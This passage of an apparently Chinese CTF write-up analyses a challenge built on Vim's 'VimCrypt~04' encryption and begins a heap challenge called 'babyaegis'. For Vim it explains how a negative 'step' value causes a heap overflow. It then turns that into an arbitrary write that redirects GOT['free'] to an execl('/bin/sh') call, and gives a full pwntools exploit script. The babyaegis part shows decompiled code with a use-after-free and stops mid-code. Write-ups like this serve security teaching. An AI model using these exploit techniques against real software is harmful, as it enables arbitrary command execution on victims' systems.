class="number">0</span>)</span><br><span class="line">+        ps-&gt;<span class="built_in">step</span>++;</span><br><span class="line">+    ps-&gt;cur_idx = <span class="number">0</span>;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* Step 1: Inverse of Multiplication */</span></span><br><span class="line">+    i = <span class="number">4</span>;</span><br><span class="line">+    <span class="keyword">while</span> (i &lt; len)</span><br><span class="line">+    &#123;</span><br><span class="line">+        <span class="keyword">if</span> (ps-&gt;cur_idx &lt; ps-&gt;orig_size)</span><br><span class="line">+        &#123;</span><br><span class="line">+            to[ps-&gt;cur_idx+<span class="number">4</span>] = from[i];</span><br><span class="line">+            i++;</span><br><span class="line">+        &#125;</span><br><span class="line">+        ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;<span class="built_in">step</span>)%ps-&gt;<span class="built_in">size</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* Step 2: Inverse of Addition */</span></span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span>[i] = to[i+<span class="number">4</span>];</span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">4</span>+ps-&gt;shift; i &lt; len; ++i)</span><br><span class="line">+        to[i-ps-&gt;shift] = to[i];</span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        to[len-ps-&gt;shift+i] = ps-&gt;<span class="built_in">buffer</span>[i];</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">+        vim_free(ps-&gt;<span class="built_in">buffer</span>);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>很显然就是简单的加密的逆过程</p>
<h3 id="Analyze-Overflow"><a href="#Analyze-Overflow" class="headerlink" title="Analyze Overflow"></a>Analyze Overflow</h3><p>很容易注意到：step为int类型，且因为key已知，而iv为前4字节可控，step即可控，将step设置为负数即可造成溢出<br>在service下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        size = int(sys.stdin.readline())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> size &gt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    exp = sys.stdin.read(size)</span><br><span class="line">    f = tempfile.NamedTemporaryFile(prefix=<span class="string">''</span>,delete=<span class="literal">False</span>)</span><br><span class="line">    f.write(exp)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">'echo ":q" | /home/calvino/vim --clean %s'</span> % f.name)</span><br><span class="line">    sys.stdout.write(<span class="string">'looks good\n'</span>)</span><br><span class="line"></span><br><span class="line">    os.unlink(f.name)</span><br></pre></td></tr></table></figure>
<p>可以看到服务端最终操作为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#39;echo &quot;:q&quot; | &#x2F;home&#x2F;calvino&#x2F;vim --clean %s&#39; % f.name)</span><br></pre></td></tr></table></figure>
<p>因此我们主要利用的是crypt_perm_decode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to[ps-&gt;cur_idx+4] &#x3D; from[i]</span><br></pre></td></tr></table></figure>
<p>我们可以利用溢出修改to空间附近的数据<br>跟踪在decode过程中的程序流：<br>首先调用crypt_create:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crypt_create(</span><br><span class="line">    <span class="keyword">int</span>		method_nr,</span><br><span class="line">    char_u	*key,</span><br><span class="line">    char_u	*salt,</span><br><span class="line">    <span class="keyword">int</span>		salt_len,</span><br><span class="line">    char_u	*seed,</span><br><span class="line">    <span class="keyword">int</span>		seed_len)</span><br><span class="line">&#123;</span><br><span class="line">    cryptstate_T *state = (cryptstate_T *)alloc((<span class="keyword">int</span>)<span class="keyword">sizeof</span>(cryptstate_T));</span><br><span class="line"></span><br><span class="line">    state-&gt;method_nr = method_nr;</span><br><span class="line">    cryptmethods[method_nr].init_fn(state, key, salt, salt_len, seed, seed_len);</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中根据文件头”VimCrypt~04!”调用crypt_perm_init:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+crypt_perm_init(</span><br><span class="line">+    cryptstate_T    *state,</span><br><span class="line">+    char_u	    *key,</span><br><span class="line">+    char_u	    *salt UNUSED,</span><br><span class="line">+    <span class="keyword">int</span>		    salt_len UNUSED,</span><br><span class="line">+    char_u	    *seed UNUSED,</span><br><span class="line">+    <span class="keyword">int</span>		    seed_len UNUSED)</span><br><span class="line">+&#123;</span><br><span class="line">+    char_u	*p;</span><br><span class="line">+    perm_state_T	*ps;</span><br><span class="line">+</span><br><span class="line">+    ps = (perm_state_T *)alloc(<span class="keyword">sizeof</span>(perm_state_T));</span><br><span class="line">+    ps-&gt;key = <span class="number">0</span>;</span><br><span class="line">+    state-&gt;method_state = ps;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">for</span> (p = key; *p != NUL; ++p)</span><br><span class="line">+    &#123;</span><br><span class="line">+    ps-&gt;key = <span class="number">131</span>*ps-&gt;key + *p;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>紧接着调用crypt_set_cm_option和crypt_get_header_len…..设置cm参数和获得magic文件头长度以及一些运行环境init<br>下面关键调用crypt_decode_alloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">crypt_decode_alloc(</span><br><span class="line">    cryptstate_T *state,</span><br><span class="line">    char_u	*ptr,</span><br><span class="line">    <span class="keyword">long</span>	len,</span><br><span class="line">    char_u      **newptr)</span><br><span class="line">&#123;</span><br><span class="line">    cryptmethod_T *method = &amp;cryptmethods[state-&gt;method_nr];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method-&gt;decode_buffer_fn != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Has buffer function, pass through. */</span></span><br><span class="line">	<span class="keyword">return</span> method-&gt;decode_buffer_fn(state, ptr, len, newptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">	<span class="comment">/* Not buffering, just return EOF. */</span></span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line"></span><br><span class="line">    *newptr = alloc(len);</span><br><span class="line">    <span class="keyword">if</span> (*newptr == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    method-&gt;decode_fn(state, ptr, len, *newptr);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*newptr = alloc(len);</span><br><span class="line"><span class="keyword">if</span> (*newptr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">method-&gt;decode_fn(state, ptr, len, *newptr);</span><br><span class="line"><span class="keyword">return</span> len;</span><br></pre></td></tr></table></figure>
<p>newptr即为加解密开辟的空间to，这里注意alloc在内部实现，并不是在栈内开辟空间，最终调用的依然是malloc，在*newptr = alloc(len)时下断点查看堆空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x90f570 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0, </span><br><span class="line">  mchunk_size &#x3D; 49, </span><br><span class="line">  fd &#x3D; 0x61, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x90f5a0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0, </span><br><span class="line">  mchunk_size &#x3D; 43617, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到topchunk前最后一个chunk为crypt_perm_init中分配的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps &#x3D; (perm_state_T *)alloc(sizeof(perm_state_T))</span><br></pre></td></tr></table></figure>
<p>根据crypt_decode_alloc，如果我们将to分配到此perm_state_T后的临近位置，即可构造step为负数溢出修改此结构体<br>因为perm_state_T下即为topchunk，所以只要请求一个bins中没有的chunk大小即可将to分配到topchunk，即perm_state_T临近位置<br>动态调试在此刻查看bins:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x90f310 ◂— 0x0</span><br><span class="line">0x80 [  1]: 0x8f9fb0 ◂— 0x0</span><br><span class="line">0xf0 [  1]: 0x8ec260 ◂— 0x0</span><br><span class="line">0x1d0 [  1]: 0x8ed490 ◂— 0x0</span><br><span class="line">0x1f0 [  1]: 0x8e7bb0 ◂— 0x0</span><br><span class="line">0x200 [  1]: 0x8e7dc0 ◂— 0x0</span><br><span class="line">0x230 [  1]: 0x8e6290 ◂— 0x0</span><br><span class="line">0x240 [  1]: 0x8ebfa0 ◂— 0x0</span><br><span class="line">0x270 [  1]: 0x8e4cf0 ◂— 0x0</span><br><span class="line">0x2b0 [  1]: 0x8ed740 ◂— 0x0</span><br><span class="line">0x300 [  1]: 0x8e5690 ◂— 0x0</span><br><span class="line">0x370 [  1]: 0x8ec740 ◂— 0x0</span><br><span class="line">0x390 [  1]: 0x8f8b40 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x8eb770 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>所以只要构造file大小，请求一个bins中没有的chunk大小即可（请求大小为file总长度减去magic文件头的长度）<br>这时候溢出修改perm_state_T的buffer和cur_idx，即可在后面的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span>[i] = to[i+<span class="number">4</span>];</span><br></pre></td></tr></table></figure>
<p>造成任意地址写</p>
<h3 id="Analyze-EXP"><a href="#Analyze-EXP" class="headerlink" title="Analyze EXP"></a>Analyze EXP</h3><p>首先程序保护:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>没有开启pie，通过strings ./vim|grep /bin/sh看到程序存在后门:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004C915D                 mov     r8d, 0</span><br><span class="line">.text:00000000004C9163                 mov     rcx, rax</span><br><span class="line">.text:00000000004C9166                 lea     rdx, aC_2       ; &quot;-c&quot;</span><br><span class="line">.text:00000000004C916D                 lea     rsi, arg        ; &quot;sh&quot;</span><br><span class="line">.text:00000000004C9174                 lea     rdi, path       ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:00000000004C917B                 mov     eax, 0</span><br><span class="line">.text:00000000004C9180                 call    _execl</span><br></pre></td></tr></table></figure>
<p>因此我们可以修改got表，在传参时将*rax设置为要执行的命令即可<br>看到decode最后会：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000414A1A                 mov     rax, [rax+18h]</span><br><span class="line">.text:0000000000414A1E                 mov     rdi, rax</span><br><span class="line">.text:0000000000414A21                 call    vim_free</span><br></pre></td></tr></table></figure>
<p>此时rax即为我们溢出伪造的buffer位置，完全可控<br>而vim_free:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004F7808                 push    rbp</span><br><span class="line">.text:00000000004F7809                 mov     rbp, rsp</span><br><span class="line">.text:00000000004F780C                 sub     rsp, 10h</span><br><span class="line">.text:00000000004F7810                 mov     [rbp+ptr], rdi</span><br><span class="line">.text:00000000004F7814                 cmp     [rbp+ptr], 0</span><br><span class="line">.text:00000000004F7819                 jz      short loc_4F7831</span><br><span class="line">.text:00000000004F781B                 mov     eax, cs:really_exiting</span><br><span class="line">.text:00000000004F7821                 test    eax, eax</span><br><span class="line">.text:00000000004F7823                 jnz     short loc_4F7831</span><br><span class="line">.text:00000000004F7825                 mov     rax, [rbp+ptr]</span><br><span class="line">.text:00000000004F7829                 mov     rdi, rax        ; ptr</span><br><span class="line">.text:00000000004F782C                 call    _free</span><br></pre></td></tr></table></figure>
<p>最终会调用_free，且rax依然为buffer位置，因此我们修改GOT[‘free’]，并最后写入一串命令，即可调用execl(“/bin/sh”, “sh”, “-c”, *buffer, 0LL)造成任意命令执行</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">()</span>:</span></span><br><span class="line">  final_size=<span class="number">0xc</span>+<span class="number">0x48</span><span class="comment">#len(magic)+len(date)</span></span><br><span class="line">  payload=<span class="string">"VimCrypt~04!"</span><span class="comment">#magic</span></span><br><span class="line">  payload+=p32(<span class="number">0xffffffff</span>^<span class="number">0x61</span>)[::<span class="number">-1</span>]<span class="comment">#fake_iv-&gt;step=-1</span></span><br><span class="line">  payload+=<span class="string">'a'</span>*<span class="number">0x15</span></span><br><span class="line">  payload+=p64(<span class="number">0x8A8238</span><span class="number">-16</span>)[::<span class="number">-1</span>]<span class="comment">#cmd+GOT['free']</span></span><br><span class="line">  payload+=<span class="string">'\x37'</span><span class="comment">#(ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size=0x37ffffe2%0x47=0x17</span></span><br><span class="line">  <span class="comment">#buffer[0]~buffer[0x17]=cmd+shell_execl_addr</span></span><br><span class="line">  payload+=p64(<span class="number">0x4C915d</span>)[::<span class="number">-1</span>]<span class="comment">#shell-&gt;execl</span></span><br><span class="line">  payload+=<span class="string">'cat ./flag'</span>.ljust(<span class="number">0x10</span>,<span class="string">"\x00"</span>)[::<span class="number">-1</span>]<span class="comment">#shell</span></span><br><span class="line">  payload=payload.ljust(final_size,<span class="string">"\x00"</span>)</span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">   exp=get_payload()</span><br><span class="line">   <span class="keyword">with</span> open(<span class="string">"./kirin.exp"</span>,<span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(exp)</span><br></pre></td></tr></table></figure>
<h2 id="babyaegis"><a href="#babyaegis" class="headerlink" title="babyaegis"></a>babyaegis</h2><h3 id="Analyze-UAF-amp-amp-Overflow"><a href="#Analyze-UAF-amp-amp-Overflow" class="headerlink" title="Analyze UAF&amp;&amp;Overflow"></a>Analyze UAF&amp;&amp;Overflow</h3><p>首先程序漏洞:<br><strong>delete_note时：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)<span class="string">"Index: "</span>;</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">unsigned</span> __int64)<span class="string">"Index: "</span>);</span><br><span class="line">  v5 = read_int(<span class="string">"Index: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> || v5 &gt;= <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)&amp;notes[v5];</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v0 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v0);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)v0 )</span><br><span class="line">LABEL_16:</span><br><span class="line">    error(v0);</span><br><span class="line">  v1 = (<span class="keyword">unsigned</span> __int64)&amp;notes[v5];</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v1 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v1);</span><br><span class="line">  v2 = *(_QWORD *)v1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v2 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v2);</span><br><span class="line">  <span class="built_in">free</span>(*(__sanitizer **)v2);</span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> __int64)&amp;notes[v5];</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v3 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v3);</span><br><span class="line">  <span class="built_in">free</span>(*(__sanitizer **)v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Delete success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>free后未将指针置0，存在uaf<br><strong>update_note时:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">update_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 (__fastcall **v6)(); <span class="comment">// rdi</span></span><br><span class="line">  __int64 (__fastcall *v7)(); <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)<span class="string">"Index: "</span>;</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">unsigned</span> __int64)<span class="string">"Index: "</span>);</span><br><span class="line">  v11 = read_int(<span class="string">"Index: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> || v11 &gt;= <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)&amp;notes[v11];</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v0 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v0);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)v0 )</span><br><span class="line">LABEL_29:</span><br><span class="line">    error(v0);</span><br><span class="line">  v1 = (<span class="keyword">unsigned</span> __int64)&amp;notes[v11];</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v1 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v1);</span><br><span class="line">  v9 = *(_QWORD *)v1;</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">unsigned</span> __int64)<span class="string">"New Content: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v9 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v9);</span><br><span class="line">  v2 = *(_QWORD *)v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v9 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v9);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(*(_QWORD *)v9) + <span class="number">1</span>;</span><br><span class="line">  v10 = read_until_nl_or_max(v2, v3);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">unsigned</span> __int64)<span class="string">"New ID: "</span>);</span><br><span class="line">  v4 = read_ul(<span class="string">"New ID: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v9 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    v4 = _asan_report_load8(v9);</span><br><span class="line">  v5 = v10 + *(_QWORD *)v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v5 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    v4 = _asan_report_store8(v5);</span><br><span class="line">  *(_QWORD *)v5 = v4;</span><br><span class="line">  v6 = (__int64 (__fastcall **)())(v9 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(((v9 + <span class="number">8</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8((<span class="keyword">unsigned</span> __int64)v6);</span><br><span 